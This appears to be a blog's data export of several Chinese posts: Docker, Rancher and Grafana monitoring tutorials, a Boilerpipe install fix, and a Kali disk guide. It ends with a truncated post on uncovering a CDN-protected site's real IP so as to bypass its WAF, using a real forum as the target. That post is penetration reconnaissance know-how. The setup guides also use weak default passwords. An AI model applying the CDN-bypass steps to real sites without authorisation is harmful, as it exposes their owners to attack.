（5）添加服务base-service 镜像192.168.184.144:5000&#x2F;tensquare_base:1.0-SNAPSHOT 端口映射9001 （6）测试微服务 浏览器打开网址 http://192.168.184.144:9001/label 看是否可以看到标签列表 3.6 扩容与缩容3.6.1 扩容（1）在Rancher将创建的base-service（基础信息微服务）删除 （2）重新创建base-service ，不设置端口映射 （3）在选择菜单API –&gt;WebHooks ，点击“添加接收器”按钮 （4）填写名称等信息，选择要扩容的服务，点击创建按钮 （5）接收器列表中新增了一条记录 ，点击触发地址将地址复制到剪切板 （6）使用postman测试： 测试后，发现容器由原来的1个变为了3个 3.6.2 缩容刚才我们实现了扩容，那么如何减少容器数量呢？我们来试试如何缩容 （1）添加接收器 ,选择缩容，步长为1表示每次递减1个 ，点击创建按钮 （2）创建成功后，复制触发地址 （3）使用postman测试 4 influxDB4.1 什么是influxDB​ influxDB是一个分布式时间序列数据库。cAdvisor仅仅显示实时信息，但是不存储监视数据。因此，我们需要提供时序数据库用于存储cAdvisor组件所提供的监控信息，以便显示除实时信息之外的时序数据。\u000f 4.2 influxDB安装（1）下载镜像 1docker pull tutum/influxdb （2）创建容器 1234567docker run -di \\ -p 8083:8083 \\ -p 8086:8086 \\ --expose 8090 \\ --expose 8099 \\ --name influxsrv \\ tutum/influxdb 端口概述： 8083端口:web访问端口 8086:数据写入端口 打开浏览器 http://192.168.184.144:8083/ 4.3 influxDB常用操作4.3.1 创建数据库1CREATE DATABASE &quot;cadvisor&quot; 回车创建数据库 1SHOW DATABASES 查看数据库 4.3.2 创建用户并授权创建用户 1CREATE USER &quot;cadvisor&quot; WITH PASSWORD &#x27;cadvisor&#x27; WITH ALL PRIVILEGES 查看用户 1SHOW USRES 用户授权 123grant all privileges on cadvisor to cadvisorgrant WRITE on cadvisor to cadvisorgrant READ on cadvisor to cadvisor 4.3.3 查看采集的数据切换到cadvisor数据库，使用以下命令查看采集的数据 1SHOW MEASUREMENTS 现在我们还没有数据，如果想采集系统的数据，我们需要使用Cadvisor软件来实现 5 cAdvisor5.1 什么是cAdvisor​ Google开源的用于监控基础设施应用的工具，它是一个强大的监控工具，不需要任何配置就可以通过运行在Docker主机上的容器来监控Docker容器，而且可以监控Docker主机。更多详细操作和配置选项可以查看Github上的cAdvisor项目文档。 5.2 cAdvisor安装（1）下载镜像 1docker pull google/cadvisor （2）创建容器 1docker run --volume=/:/rootfs:ro --volume=/var/run:/var/run:rw --volume=/sys:/sys:ro --volume=/var/lib/docker/:/var/lib/docker:ro --publish=8080:8080 --detach=true --link influxsrv:influxsrv --name=cadvisor google/cadvisor -storage_driver=influxdb -storage_driver_db=cadvisor -storage_driver_host=influxsrv:8086 WEB前端访问地址 http://192.168.184.144:8080/containers/ 性能指标含义参照如下地址 https://blog.csdn.net/ZHANG_H_A&#x2F;article&#x2F;details&#x2F;53097084 再次查看influxDB，发现已经有很多数据被采集进去了。 6 Grafana6.1 什么是Grafana​ Grafana是一个可视化面板（Dashboard），有着非常漂亮的图表和布局展示，功能齐全的度量仪表盘和图形编辑器。支持Graphite、zabbix、InfluxDB、Prometheus和OpenTSDB作为数据源。Grafana主要特性：灵活丰富的图形化选项；可以混合多种风格；支持白天和夜间模式；多个数据源。 6.2 Grafana安装（1）下载镜像 1docker pull grafana/grafana （2）创建容器 1docker run -d -p 3001:3000 -e INFLUXDB_HOST=influxsrv -e INFLUXDB_PORT=8086 -e INFLUXDB_NAME=cadvisor -e INFLUXDB_USER=cadvisor -e INFLUXDB_PASS=cadvisor --link influxsrv:influxsrv --name grafana grafana/grafana （3）访问 1http://192.168.184.144:3001 用户名密码均为admin （4）登录后提示你修改密码 （5）之后进入主页面 6.3 Grafana的使用6.3.1 添加数据源（1）点击设置，DataSource （2）点击添加data source （3）为数据源起个名称，指定类型、地址、以及连接的数据库名、用户名和密码 点击保存。数据源建立成功 6.3.2 添加仪表盘（1）选择Dashboards –Manager （2）点击“添加”按钮 （3）点击Graph 图标 （4）出现下面图表的界面 ，点击Panel Title 选择Edit (编辑) （5）定义标题等基础信息 （6）设置查询的信息为内存，指定容器名称 （7）指定y轴的单位 为M （8）保存 填写名称 6.4.3 预警通知设置（1）选择菜单 alerting–&gt; Notification channels （2）点击Add channel 按钮 （3）填写名称，选择类型为webhook ,填写钩子地址 这个钩子地址是之前对base微服务扩容的地址 （4）点击SendTest 测试 观察基础微服务是否增加容器 （5）点击save保存 （6）按照同样的方法添加缩容地址 6.4.4 仪表盘预警设置（1）再次打开刚刚编辑的仪表盘 （2）点击 Create Alert 设置预警线 （3）选择通知 保存更改","categories":[{"name":"Java学习","slug":"Java学习","permalink":"http://blog.ioimp.top/categories/Java%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Jenkins","slug":"Jenkins","permalink":"http://blog.ioimp.top/tags/Jenkins/"},{"name":"Rancher","slug":"Rancher","permalink":"http://blog.ioimp.top/tags/Rancher/"},{"name":"influxDB","slug":"influxDB","permalink":"http://blog.ioimp.top/tags/influxDB/"},{"name":"cAdvisor","slug":"cAdvisor","permalink":"http://blog.ioimp.top/tags/cAdvisor/"},{"name":"Grafana","slug":"Grafana","permalink":"http://blog.ioimp.top/tags/Grafana/"}]},{"title":"ES6模块化","slug":"ES6模块化","date":"2023-11-16T01:51:36.000Z","updated":"2023-11-16T08:30:58.877Z","comments":true,"path":"2023/11/16/ES6模块化/","link":"","permalink":"http://blog.ioimp.top/2023/11/16/ES6%E6%A8%A1%E5%9D%97%E5%8C%96/","excerpt":"","text":"","categories":[{"name":"前端","slug":"前端","permalink":"http://blog.ioimp.top/categories/%E5%89%8D%E7%AB%AF/"}],"tags":[{"name":"ES6","slug":"ES6","permalink":"http://blog.ioimp.top/tags/ES6/"},{"name":"前端学习","slug":"前端学习","permalink":"http://blog.ioimp.top/tags/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/"}]},{"title":"Docker基础学习","slug":"docker","date":"2023-11-13T01:22:04.000Z","updated":"2023-11-16T08:44:52.317Z","comments":true,"path":"2023/11/13/docker/","link":"","permalink":"http://blog.ioimp.top/2023/11/13/docker/","excerpt":"","text":"Docker学习目标： 掌握Docker基础知识，能够理解Docker镜像与容器的概念 完成Docker安装与启动 掌握Docker镜像与容器相关命令 掌握Tomcat Nginx 等软件的常用应用的安装 掌握docker迁移与备份相关命令 能够运用Dockerfile编写创建容器的脚本 能够搭建与使用docker私有仓库 1 Docker简介1.1 什么是虚拟化​ 在计算机中，虚拟化（英语：Virtualization）是一种资源管理技术，是将计算机的各种实体资源，如服务器、网络、内存及存储等，予以抽象、转换后呈现出来，打破实体结构间的不可切割的障碍，使用户可以比原本的组态更好的方式来应用这些资源。这些资源的新虚拟部份是不受现有资源的架设方式，地域或物理组态所限制。一般所指的虚拟化资源包括计算能力和资料存储。 ​ 在实际的生产环境中，虚拟化技术主要用来解决高性能的物理硬件产能过剩和老的旧的硬件产能过低的重组重用，透明化底层物理硬件，从而最大化的利用物理硬件 对资源充分利用 ​ 虚拟化技术种类很多，例如：软件虚拟化、硬件虚拟化、内存虚拟化、网络虚拟化(vip)、桌面虚拟化、服务虚拟化、虚拟机等等。 1.2 什么是Docker​ Docker 是一个开源项目，诞生于 2013 年初，最初是 dotCloud 公司内部的一个业余项目。它基于 Google 公司推出的 Go 语言实现。 项目后来加入了 Linux 基金会，遵从了 Apache 2.0 协议，项目代码在 GitHub 上进行维护。 ​ ​ Docker 自开源后受到广泛的关注和讨论，以至于 dotCloud 公司后来都改名为 Docker Inc。Redhat 已经在其 RHEL6.5 中集中支持 Docker；Google 也在其 PaaS 产品中广泛应用。 ​ Docker 项目的目标是实现轻量级的操作系统虚拟化解决方案。 Docker 的基础是 Linux 容器（LXC）等技术。 ​ 在 LXC 的基础上 Docker 进行了进一步的封装，让用户不需要去关心容器的管理，使得操作更为简便。用户操作 Docker 的容器就像操作一个快速轻量级的虚拟机一样简单。 为什么选择Docker? （1）上手快。 ​ 用户只需要几分钟，就可以把自己的程序“Docker化”。Docker依赖于“写时复制”（copy-on-write）模型，使修改应用程序也非常迅速，可以说达到“随心所致，代码即改”的境界。 随后，就可以创建容器来运行应用程序了。大多数Docker容器只需要不到1秒中即可启动。由于去除了管理程序的开销，Docker容器拥有很高的性能，同时同一台宿主机中也可以运行更多的容器，使用户尽可能的充分利用系统资源。 （2）职责的逻辑分类 ​ 使用Docker，开发人员只需要关心容器中运行的应用程序，而运维人员只需要关心如何管理容器。Docker设计的目的就是要加强开发人员写代码的开发环境与应用程序要部署的生产环境一致性。从而降低那种“开发时一切正常，肯定是运维的问题（测试环境都是正常的，上线后出了问题就归结为肯定是运维的问题）” （3）快速高效的开发生命周期 ​ Docker的目标之一就是缩短代码从开发、测试到部署、上线运行的周期，让你的应用程序具备可移植性，易于构建，并易于协作。（通俗一点说，Docker就像一个盒子，里面可以装很多物件，如果需要这些物件的可以直接将该大盒子拿走，而不需要从该盒子中一件件的取。） （4）鼓励使用面向服务的架构 ​ Docker还鼓励面向服务的体系结构和微服务架构。Docker推荐单个容器只运行一个应用程序或进程，这样就形成了一个分布式的应用程序模型，在这种模型下，应用程序或者服务都可以表示为一系列内部互联的容器，从而使分布式部署应用程序，扩展或调试应用程序都变得非常简单，同时也提高了程序的内省性。（当然，可以在一个容器中运行多个应用程序） 1.3 容器与虚拟机比较​ 下面的图片比较了 Docker 和传统虚拟化方式的不同之处，可见容器是在操作系统层面上实现虚拟化，直接复用本地主机的操作系统，而传统方式则是在硬件层面实现。 与传统的虚拟机相比，Docker优势体现为启动速度快、占用体积小。 1.4 Docker 组件1.4.1 Docker服务器与客户端​ Docker是一个客户端-服务器（C&#x2F;S）架构程序。Docker客户端只需要向Docker服务器或者守护进程发出请求，服务器或者守护进程将完成所有工作并返回结果。Docker提供了一个命令行工具Docker以及一整套RESTful API。你可以在同一台宿主机上运行Docker守护进程和客户端，也可以从本地的Docker客户端连接到运行在另一台宿主机上的远程Docker守护进程。 1.4.2 Docker镜像与容器​ 镜像是构建Docker的基石。用户基于镜像来运行自己的容器。镜像也是Docker生命周期中的“构建”部分。镜像是基于联合文件系统的一种层式结构，由一系列指令一步一步构建出来。例如： 添加一个文件； 执行一个命令； 打开一个窗口。 也可以将镜像当作容器的“源代码”。镜像体积很小，非常“便携”，易于分享、存储和更新。 ​ Docker可以帮助你构建和部署容器，你只需要把自己的应用程序或者服务打包放进容器即可。容器是基于镜像启动起来的，容器中可以运行一个或多个进程。我们可以认为，镜像是Docker生命周期中的构建或者打包阶段，而容器则是启动或者执行阶段。 容器基于镜像启动，一旦容器启动完成后，我们就可以登录到容器中安装自己需要的软件或者服务。 所以Docker容器就是： ​ 一个镜像格式； ​ 一些列标准操作； ​ 一个执行环境。 ​ Docker借鉴了标准集装箱的概念。标准集装箱将货物运往世界各地，Docker将这个模型运用到自己的设计中，唯一不同的是：集装箱运输货物，而Docker运输软件。 和集装箱一样，Docker在执行上述操作时，并不关心容器中到底装了什么，它不管是web服务器，还是数据库，或者是应用程序服务器什么的。所有的容器都按照相同的方式将内容“装载”进去。 Docker也不关心你要把容器运到何方：我们可以在自己的笔记本中构建容器，上传到Registry，然后下载到一个物理的或者虚拟的服务器来测试，在把容器部署到具体的主机中。像标准集装箱一样，Docker容器方便替换，可以叠加，易于分发，并且尽量通用。 1.4.3 Registry（注册中心）​ Docker用Registry来保存用户构建的镜像。Registry分为公共和私有两种。Docker公司运营公共的Registry叫做Docker Hub。用户可以在Docker Hub注册账号，分享并保存自己的镜像（说明：在Docker Hub下载镜像巨慢，可以自己构建私有的Registry）。 ​ https://hub.docker.com/ 2 Docker安装与启动2.1 安装Docker​ Docker官方建议在Ubuntu中安装，因为Docker是基于Ubuntu发布的，而且一般Docker出现的问题Ubuntu是最先更新或者打补丁的。在很多版本的CentOS中是不支持更新最新的一些补丁包的。 ​ 由于我们学习的环境都使用的是CentOS，因此这里我们将Docker安装到CentOS上。注意：这里建议安装在CentOS7.x以上的版本，在CentOS6.x的版本中，安装前需要安装其他很多的环境而且Docker很多补丁不支持更新。 ​ 请直接挂载课程配套的Centos7.x镜像 （1）yum 包更新到最新 1sudo yum update （2）安装需要的软件包， yum-util 提供yum-config-manager功能，另外两个是devicemapper驱动依赖的 1sudo yum install -y yum-utils device-mapper-persistent-data lvm2 （3）设置yum源为阿里云 1sudo yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo （4）安装docker 1sudo yum install docker-ce （5）安装后查看docker版本 1docker -v 2.2 设置ustc的镜像ustc是老牌的linux镜像服务提供者了，还在遥远的ubuntu 5.04版本的时候就在用。ustc的docker镜像加速器速度很快。ustc docker mirror的优势之一就是不需要注册，是真正的公共服务。 https://lug.ustc.edu.cn/wiki/mirrors/help/docker 编辑该文件： 1vi /etc/docker/daemon.json 在该文件中输入如下内容： 123&#123;&quot;registry-mirrors&quot;: [&quot;https://docker.mirrors.ustc.edu.cn&quot;]&#125; 2.3 Docker的启动与停止systemctl命令是系统服务管理器指令 启动docker： 1systemctl start docker 停止docker： 1systemctl stop docker 重启docker： 1systemctl restart docker 查看docker状态： 1systemctl status docker 开机启动： 1systemctl enable docker 查看docker概要信息 1docker info 查看docker帮助文档 1docker --help 3 常用命令3.1 镜像相关命令3.1.1 查看镜像1docker images REPOSITORY：镜像名称 TAG：镜像标签 IMAGE ID：镜像ID CREATED：镜像的创建日期（不是获取该镜像的日期） SIZE：镜像大小 这些镜像都是存储在Docker宿主机的&#x2F;var&#x2F;lib&#x2F;docker目录下 3.1.2 搜索镜像如果你需要从网络中查找需要的镜像，可以通过以下命令搜索 1docker search 镜像名称 NAME：仓库名称 DESCRIPTION：镜像描述 STARS：用户评价，反应一个镜像的受欢迎程度 OFFICIAL：是否官方 AUTOMATED：自动构建，表示该镜像由Docker Hub自动构建流程创建的 3.1.3 拉取镜像拉取镜像就是从中央仓库中下载镜像到本地 1docker pull 镜像名称 例如，我要下载centos7镜像 1docker pull centos:7 3.1.4 删除镜像按镜像ID删除镜像 1docker rmi 镜像ID 删除所有镜像 1docker rmi `docker images -q` 3.2 容器相关命令3.2.1 查看容器查看正在运行的容器 1docker ps 查看所有容器 1docker ps –a 查看最后一次运行的容器 1docker ps –l 查看停止的容器 1docker ps -f status=exited 3.2.2 创建与启动容器创建容器常用的参数说明： 创建容器命令：docker run -i：表示运行容器 -t：表示容器启动后会进入其命令行。加入这两个参数后，容器创建就能登录进去。即分配一个伪终端。 –name :为创建的容器命名。 -v：表示目录映射关系（前者是宿主机目录，后者是映射到宿主机上的目录），可以使用多个－v做多个目录或文件映射。注意：最好做目录映射，在宿主机上做修改，然后共享到容器上。 -d：在run后面加上-d参数,则会创建一个守护式容器在后台运行（这样创建容器后不会自动登录容器，如果只加-i -t两个参数，创建后就会自动进去容器）。 -p：表示端口映射，前者是宿主机端口，后者是容器内的映射端口。可以使用多个-p做多个端口映射 （1）交互式方式创建容器 1docker run -it --name=容器名称 镜像名称:标签 /bin/bash 这时我们通过ps命令查看，发现可以看到启动的容器，状态为启动状态 退出当前容器 1exit （2）守护式方式创建容器： 1docker run -di --name=容器名称 镜像名称:标签 登录守护式容器方式： 1docker exec -it 容器名称 (或者容器ID) /bin/bash 3.2.3 停止与启动容器停止容器： 1docker stop 容器名称（或者容器ID） 启动容器： 1docker start 容器名称（或者容器ID） 3.2.4 文件拷贝如果我们需要将文件拷贝到容器内可以使用cp命令 1docker cp 需要拷贝的文件或目录 容器名称:容器目录 也可以将文件从容器内拷贝出来 1docker cp 容器名称:容器目录 需要拷贝的文件或目录 3.2.5 目录挂载我们可以在创建容器的时候，将宿主机的目录与容器内的目录进行映射，这样我们就可以通过修改宿主机某个目录的文件从而去影响容器。创建容器 添加-v参数 后边为 宿主机目录:容器目录，例如： 1docker run -di -v /usr/local/myhtml:/usr/local/myhtml --name=mycentos3 centos:7 如果你共享的是多级的目录，可能会出现权限不足的提示。 这是因为CentOS7中的安全模块selinux把权限禁掉了，我们需要添加参数 –privileged&#x3D;true 来解决挂载的目录没有权限的问题 3.2.6 查看容器IP地址我们可以通过以下命令查看容器运行的各种数据 1docker inspect 容器名称（容器ID） 也可以直接执行下面的命令直接输出IP地址 1docker inspect --format=&#x27;&#123;&#123;.NetworkSettings.IPAddress&#125;&#125;&#x27; 容器名称（容器ID） 3.2.7 删除容器删除指定的容器： 1docker rm 容器名称（容器ID） 4 应用部署4.1 MySQL部署（1）拉取mysql镜像 1docker pull centos/mysql-57-centos7 （2）创建容器 1docker run -di --name=tensquare_mysql -p 33306:3306 -e MYSQL_ROOT_PASSWORD=123456 mysql -p 代表端口映射，格式为 宿主机映射端口:容器运行端口 -e 代表添加环境变量 MYSQL_ROOT_PASSWORD 是root用户的登陆密码 （3）远程登录mysql 连接宿主机的IP ,指定端口为33306 4.2 tomcat部署（1）拉取镜像 1docker pull tomcat:7-jre7 （2）创建容器 创建容器 -p表示地址映射 12docker run -di --name=mytomcat -p 9000:8080 -v /usr/local/webapps:/usr/local/tomcat/webapps tomcat:7-jre7 4.3 Nginx部署（1）拉取镜像 1docker pull nginx （2）创建Nginx容器 1docker run -di --name=mynginx -p 80:80 nginx 4.4 Redis部署（1）拉取镜像 1docker pull redis （2）创建容器 1docker run -di --name=myredis -p 6379:6379 redis 5 迁移与备份5.1 容器保存为镜像我们可以通过以下命令将容器保存为镜像 1docker commit mynginx mynginx_i 5.2 镜像备份我们可以通过以下命令将镜像保存为tar 文件 1docker save -o mynginx.tar mynginx_i 5.3 镜像恢复与迁移首先我们先删除掉mynginx_img镜像 然后执行此命令进行恢复 1docker load -i mynginx.tar -i 输入的文件 执行后再次查看镜像，可以看到镜像已经恢复 6 Dockerfile6.1 什么是DockerfileDockerfile是由一系列命令和参数构成的脚本，这些命令应用于基础镜像并最终创建一个新的镜像。 1、对于开发人员：可以为开发团队提供一个完全一致的开发环境；2、对于测试人员：可以直接拿开发时所构建的镜像或者通过Dockerfile文件构建一个新的镜像开始工作了；3、对于运维人员：在部署时，可以实现应用的无缝移植。 6.2 常用命令 命令 作用 FROM image_name:tag 定义了使用哪个基础镜像启动构建流程 MAINTAINER user_name 声明镜像的创建者 ENV key value 设置环境变量 (可以写多条) RUN command 是Dockerfile的核心部分(可以写多条) ADD source_dir&#x2F;file dest_dir&#x2F;file 将宿主机的文件复制到容器内，如果是一个压缩文件，将会在复制后自动解压 COPY source_dir&#x2F;file dest_dir&#x2F;file 和ADD相似，但是如果有压缩文件并不能解压 WORKDIR path_dir 设置工作目录 6.3 使用脚本创建镜像步骤： （1）创建目录 1mkdir –p /usr/local/dockerjdk8 （2）下载jdk-8u171-linux-x64.tar.gz并上传到服务器（虚拟机）中的&#x2F;usr&#x2F;local&#x2F;dockerjdk8目录 （3）创建文件Dockerfile vi Dockerfile 123456789101112131415#依赖镜像名称和IDFROM centos:7#指定镜像创建者信息MAINTAINER ITCAST#切换工作目录WORKDIR /usrRUN mkdir /usr/local/java#ADD 是相对路径jar,把java添加到容器中ADD jdk-8u171-linux-x64.tar.gz /usr/local/java/#配置java环境变量ENV JAVA_HOME /usr/local/java/jdk1.8.0_171ENV JRE_HOME $JAVA_HOME/jreENV CLASSPATH $JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/lib:$CLASSPATHENV PATH $JAVA_HOME/bin:$PATH （4）执行命令构建镜像 1docker build -t=&#x27;jdk1.8&#x27; . 注意后边的空格和点，不要省略 （5）查看镜像是否建立完成 1docker images 7 Docker私有仓库7.1 私有仓库搭建与配置（1）拉取私有仓库镜像（此步省略） 1docker pull registry （2）启动私有仓库容器 1docker run -di --name=registry -p 5000:5000 registry （3）打开浏览器 输入地址http://192.168.184.141:5000/v2/_catalog看到`{&quot;repositories&quot;:[]}` 表示私有仓库搭建成功并且内容为空 （4）修改daemon.json 1vi /etc/docker/daemon.json 添加以下内容，保存退出。 1&#123;&quot;insecure-registries&quot;:[&quot;192.168.184.141:5000&quot;]&#125; 此步用于让 docker信任私有仓库地址 （5）重启docker 服务 1systemctl restart docker 7.2 镜像上传至私有仓库（1）标记此镜像为私有仓库的镜像 1docker tag jdk1.8 192.168.184.141:5000/jdk1.8 （2）再次启动私服容器 1docker start registry （3）上传标记的镜像 1docker push 192.168.184.141:5000/jdk1.8","categories":[{"name":"Java学习","slug":"Java学习","permalink":"http://blog.ioimp.top/categories/Java%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"http://blog.ioimp.top/tags/Docker/"},{"name":"Java学习","slug":"Java学习","permalink":"http://blog.ioimp.top/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"微服务","slug":"微服务","permalink":"http://blog.ioimp.top/tags/%E5%BE%AE%E6%9C%8D%E5%8A%A1/"}]},{"title":"尝试安装Boilerpipe-py3时出现404错误","slug":"尝试安装Boilerpipe-py3时出现404错误","date":"2023-08-21T09:28:34.000Z","updated":"2023-08-21T09:31:59.404Z","comments":true,"path":"2023/08/21/尝试安装Boilerpipe-py3时出现404错误/","link":"","permalink":"http://blog.ioimp.top/2023/08/21/%E5%B0%9D%E8%AF%95%E5%AE%89%E8%A3%85Boilerpipe-py3%E6%97%B6%E5%87%BA%E7%8E%B0404%E9%94%99%E8%AF%AF/","excerpt":"","text":"问题提出Boilerpipe是一个很棒的清理网页的Java程序，我以前也用过它。我今天注意到，许多用户无法安装Python包装器版本并得到404和其他错误。 123456789101112131415161718192021C:\\Users\\COLIN\\Downloads\\boilerpipe-py3-1.2.0.0\\boilerpipe-py3-1.2.0.0&gt;python setup.pyTraceback (most recent call last): File &quot;C:\\Users\\COLIN\\Downloads\\boilerpipe-py3-1.2.0.0\\boilerpipe-py3-1.2.0.0\\setup.py&quot;, line 33, in &lt;module&gt; download_jars(datapath=DATAPATH) File &quot;C:\\Users\\COLIN\\Downloads\\boilerpipe-py3-1.2.0.0\\boilerpipe-py3-1.2.0.0\\setup.py&quot;, line 26, in download_jars urlretrieve(tgz_url, tgz_name) File &quot;D:\\pythonProject\\python\\lib\\urllib\\request.py&quot;, line 241, in urlretrieve with contextlib.closing(urlopen(url, data)) as fp: File &quot;D:\\pythonProject\\python\\lib\\urllib\\request.py&quot;, line 216, in urlopen return opener.open(url, data, timeout) File &quot;D:\\pythonProject\\python\\lib\\urllib\\request.py&quot;, line 525, in open response = meth(req, response) File &quot;D:\\pythonProject\\python\\lib\\urllib\\request.py&quot;, line 634, in http_response response = self.parent.error( File &quot;D:\\pythonProject\\python\\lib\\urllib\\request.py&quot;, line 563, in error return self._call_chain(*args) File &quot;D:\\pythonProject\\python\\lib\\urllib\\request.py&quot;, line 496, in _call_chain result = func(*args) File &quot;D:\\pythonProject\\python\\lib\\urllib\\request.py&quot;, line 643, in http_error_default raise HTTPError(req.full_url, code, msg, hdrs, fp)urllib.error.HTTPError: HTTP Error 404: Not Found 问题解决我也遇到了同样的问题，这是因为boilerpipe被移动了。我通过在installation tar.gz内的setup.py中将以下代码行从pypi更改为： 老行： 1tgz_url = &#x27;https://boilerpipe.googlecode.com/files/boilerpipe-&#123;0&#125;-bin.tar.gz&#x27;.format(version) 新行： 1tgz_url = &#x27;https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/boilerpipe/boilerpipe-&#123;0&#125;-bin.tar.gz&#x27;.format(version) 重新压缩整个文件夹，并在新的压缩目录上运行pip install。","categories":[{"name":"开发奇遇记","slug":"开发奇遇记","permalink":"http://blog.ioimp.top/categories/%E5%BC%80%E5%8F%91%E5%A5%87%E9%81%87%E8%AE%B0/"}],"tags":[{"name":"Boilerpipe","slug":"Boilerpipe","permalink":"http://blog.ioimp.top/tags/Boilerpipe/"},{"name":"url地址变迁","slug":"url地址变迁","permalink":"http://blog.ioimp.top/tags/url%E5%9C%B0%E5%9D%80%E5%8F%98%E8%BF%81/"},{"name":"Stack Overflow","slug":"Stack-Overflow","permalink":"http://blog.ioimp.top/tags/Stack-Overflow/"}]},{"title":"kali Linux磁盘扩容","slug":"kali-Linux磁盘扩容","date":"2023-08-18T06:30:54.000Z","updated":"2023-08-18T06:38:03.468Z","comments":true,"path":"2023/08/18/kali-Linux磁盘扩容/","link":"","permalink":"http://blog.ioimp.top/2023/08/18/kali-Linux%E7%A3%81%E7%9B%98%E6%89%A9%E5%AE%B9/","excerpt":"","text":"在安装kali时，我们有时候会给kali分配的空间比较少。刚开始还算够用，但随着软件的不断安装和系统的更新。这时我们之前分配的空间就显得不足了。那该怎样扩容你的磁盘呢？首先我们查看当前磁盘占有率 终端执行命令！ df -h 编辑切换为居中 可以看到，目前我们已经占有了58%，&#x2F;便是我们的根目录。 😘增加磁盘在vmware虚拟机中，选择编辑虚拟机设置&gt;磁盘&gt;扩展 设置最大磁盘大小，这里我的磁盘也比较有限，设置60G 然后重新启动Kali linux虚拟机，会发现磁盘的容量并没有增加，这里是因为我们没有对其进行挂载。我们使用kali中的磁盘管理工具进行挂载，执行下面的命令。 这时候，我们可以看到有15G没有分配的空间。这便是刚才扩容的部分。 停用SWAP空间 先将未分配的15G给到extended上，选择extended右键调整大小。向右拖到可以调整大小。 然后移动linux-swap的位置 这里注意是点击白色的部分，向右移动到最后。 点击调整大小移动后点击确定 再次选择extended，调整大小&#x2F;移动，向右拖动将里面的空间全给出去。 对齐到需要选择柱面，然后保存 现在我们来调整&#x2F;dev&#x2F;sda1分区的大小。向右拖动就行了。 最后点击保存 现在我们来看看 已经成功了。 原理我们是不能直接给&#x2F;dev&#x2F;sda1分区调整大小的。只能通过swap（交换空间）进行中转。然后再调整&#x2F;dev&#x2F;sda1分区的大小就行了。最后一定要记得保存哦！ https://www.bilibili.com/read/cv19163012 出处：bilibili","categories":[{"name":"实用技巧","slug":"实用技巧","permalink":"http://blog.ioimp.top/categories/%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/"}],"tags":[{"name":"磁盘分区","slug":"磁盘分区","permalink":"http://blog.ioimp.top/tags/%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA/"},{"name":"kali-linux","slug":"kali-linux","permalink":"http://blog.ioimp.top/tags/kali-linux/"}]},{"title":"部署CDN的网站找真实IP","slug":"部署CDN的网站找真实IP","date":"2023-08-15T14:40:26.000Z","updated":"2023-08-15T16:05:36.829Z","comments":true,"path":"2023/08/15/部署CDN的网站找真实IP/","link":"","permalink":"http://blog.ioimp.top/2023/08/15/%E9%83%A8%E7%BD%B2CDN%E7%9A%84%E7%BD%91%E7%AB%99%E6%89%BE%E7%9C%9F%E5%AE%9EIP/","excerpt":"","text":"部署CDN的网站找真实IP1. 概述目前很多网站使用了cdn服务，用了此服务 可以隐藏服务器的真实IP，加速网站静态文件的访问，而且你请求网站服务时，cdn服务会根据你所在的地区，选择合适的线路给予你访问，由此达网站加速的效果，cdn不仅可以加速网站访问，还可以提供waf服务，如防止cc攻击，SQL注入拦截等多种功能，再说使用cdn的成本不太高，很多云服务器也免费提供此服务。在进行黑盒测试的时候，往往成了拦路石，所以掌握cdn找真实ip成了不得不掌握的一项技术。 2. 判断是否CDNping 域名 使用超级ping http://ping.chinaz.com/ http://ping.aizhan.com/ https://www.17ce.com/ http://ping.chinaz.com/www.t00ls.net 不同的地区访问有着不同的IP，这样就确定了该域名使用了cdn了。 3. 找真实IP的方法集合找到真实IP可以继续旁站检测，找其他站点进行突破，也可以绕过cdn进行访问，从而绕过waf针对攻击语句的拦截 发现有攻击语句就会对攻击的IP封堵。 3.1. dns历史绑定记录通过以下这些网站可以访问dns的解析，有可能存在未有绑cdn之前的记录。 https://dnsdb.io/zh-cn/ ###DNS查询 https://x.threatbook.cn/ ###微步在线 http://viewdns.info/ ###DNS、IP等查询 https://tools.ipip.net/cdn.php ###CDN查询IP https://sitereport.netcraft.com/?url=域名 查询WWW.T00Ls.net的历史记录 https://site.ip138.com/www.t00ls.net/ 3.2. 子域名解析通过子域名的解析指向 也有可能指向目标的同一个IP上。 使用工具对其子域名进行穷举 在线子域名查询 https://securitytrails.com/list/apex_domain/t00ls.net http://tool.chinaz.com/subdomain/t00ls.net https://phpinfo.me/domain/ 找到子域名继续确认子域名没有cdn的情况下批量进行域名解析查询，有cdn的情况继续查询历史。 域名批量解析 http://tools.bugscaner.com/domain2ip.html 3.3. 国外dns获取真实IP部分cdn只针对国内的ip访问，如果国外ip访问域名 即可获取真实IP 全世界DNS地址： http://www.ab173.com/dns/dns_world.php https://dnsdumpster.com/ https://dnshistory.org/ http://whoisrequest.com/history/ https://completedns.com/dns-history/ http://dnstrails.com/ https://who.is/domain-history/ http://research.domaintools.com/research/hosting-history/ http://site.ip138.com/ http://viewdns.info/iphistory/ https://dnsdb.io/zh-cn/ https://www.virustotal.com/ https://x.threatbook.cn/ http://viewdns.info/ http://www.17ce.com/ http://toolbar.netcraft.com/site_report?url= https://securitytrails.com/ https://tools.ipip.net/cdn.php 3.4. ico图标通过空间搜索找真实iphttps://www.t00ls.net/favicon.ico 下载图标 放到fofa识别 通过fofa搜图标 通过这样查询 快速定位资源 查看端口是否开放 这里没有开放 通过zoomeye搜图标 查看端口开放情况 绑定hosts进行测试 这应该是真实ip了。 3.5. fofa搜索真实IPdomain&#x3D;”t00ls.net” 302一般是cdn 3.6. 通过censys找真实ipCensys工具就能实现对整个互联网的扫描，Censys是一款用以搜索联网设备信息的新型搜索引擎，能够扫描整个互联网，Censys会将互联网所有的ip进行扫面和连接，以及证书探测。 若目标站点有https证书，并且默认虚拟主机配了https证书，我们就可以找所有目标站点是该https证书的站点。 通过协议查询 https://censys.io/ipv4?q=((www.t00ls.net) AND protocols: “443&#x2F;https”) AND tags.raw: “https”&amp; 443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names:moonsec.com 3.7. 360测绘中心https://quake.360.cn 3.8. 